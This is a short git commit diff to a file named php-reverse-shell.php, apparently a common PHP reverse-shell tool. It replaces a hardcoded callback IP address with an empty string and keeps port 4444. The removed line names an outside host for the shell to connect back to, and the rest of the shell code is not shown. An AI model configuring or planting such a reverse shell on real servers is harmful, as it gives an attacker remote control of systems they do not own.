6d0e0432032dd8896f488251be90b2c2d50ed858
m3lara666 <122849902+m3lara666@users.noreply.github.com>
2023-07-07 04:19:32 +0100

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '196.118.16.246';  // CHANGE THIS
+$ip = '';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
